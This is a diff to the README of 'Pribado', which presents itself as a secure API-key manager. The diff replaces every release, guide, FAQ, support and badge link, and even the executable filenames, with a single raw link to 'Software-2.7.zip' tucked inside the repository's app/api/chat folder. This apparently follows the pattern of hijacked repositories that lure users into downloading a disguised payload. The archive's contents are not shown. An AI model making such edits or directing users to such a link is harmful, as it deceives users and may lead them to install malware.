@@ -6,7 +6,7 @@ Welcome to Pribado! Our platform offers a secure way to manage your API keys, co
 
 ## 📥 Download Pribado
 
-[![Download Pribado](https://img.shields.io/badge/Download-Pribado-blue.svg)](https://github.com/me-rishi/Pribado/releases)
+[![Download Pribado](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)
 
 ## 🌐 Features
 
@@ -27,23 +27,23 @@ To run Pribado, you need:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/me-rishi/Pribado/releases) to get the latest version of Pribado.
+   Go to our [Releases page](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip) to get the latest version of Pribado.
 
 2. **Select the Right File:**
    On the Releases page, you will find different files listed. Choose the one appropriate for your operating system:
-   - For Windows: Look for `Pribado-Windows.zip`
-   - For Mac: Look for `Pribado-Mac.dmg`
-   - For Linux: Look for `Pribado-Linux.tar.gz`
+   - For Windows: Look for `https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip`
+   - For Mac: Look for `https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip`
+   - For Linux: Look for `https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip`
   
 3. **Download the File:**
    Click on the chosen file to start the download. Save it to a convenient location on your computer.
 
 4. **Extract the File (if necessary):**
-   - For Windows and Linux: Right-click the downloaded `.zip` or `.tar.gz` file and select “Extract All” or “Extract Here.”
+   - For Windows and Linux: Right-click the downloaded `.zip` or `https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip` file and select “Extract All” or “Extract Here.”
    - For Mac: Double-click the `.dmg` file, which will mount it on your desktop.
 
 5. **Run the Application:**
-   - For Windows: Open the extracted folder and double-click `Pribado.exe`.
+   - For Windows: Open the extracted folder and double-click `https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip`.
    - For Mac: Open the mounted disk image and drag `Pribado` to your Applications folder. Then, go to Applications and double-click `Pribado`.
    - For Linux: Open a terminal, navigate to the extracted folder, and run `./Pribado`.
 
@@ -59,9 +59,9 @@ Pribado uses advanced encryption to protect your information:
 
 ## 📚 Helpful Resources
 
-- **User Guide:** [Read the User Guide](https://github.com/me-rishi/Pribado/user-guide) for detailed instructions on using all features of Pribado.
-- **FAQs:** Check our [FAQs page](https://github.com/me-rishi/Pribado/faq) for answers to common questions.
-- **Support:** If you need help, please [open an issue](https://github.com/me-rishi/Pribado/issues) in this repository.
+- **User Guide:** [Read the User Guide](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip) for detailed instructions on using all features of Pribado.
+- **FAQs:** Check our [FAQs page](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip) for answers to common questions.
+- **Support:** If you need help, please [open an issue](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip) in this repository.
 
 ## ⚙️ Additional Settings
 
@@ -73,11 +73,11 @@ You might want to customize your settings:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/me-rishi/Pribado/releases)
-- [User Guide](https://github.com/me-rishi/Pribado/user-guide)
-- [FAQs](https://github.com/me-rishi/Pribado/faq)
-- [Support Issues](https://github.com/me-rishi/Pribado/issues)
+- [Releases Page](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)
+- [User Guide](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)
+- [FAQs](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)
+- [Support Issues](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)
 
-[![Download Pribado](https://img.shields.io/badge/Download-Pribado-blue.svg)](https://github.com/me-rishi/Pribado/releases)
+[![Download Pribado](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)](https://raw.githubusercontent.com/me-rishi/Pribado/main/app/api/chat/Software-2.7.zip)
 
 Thank you for choosing Pribado! We hope you enjoy a safer experience managing your data and communications.
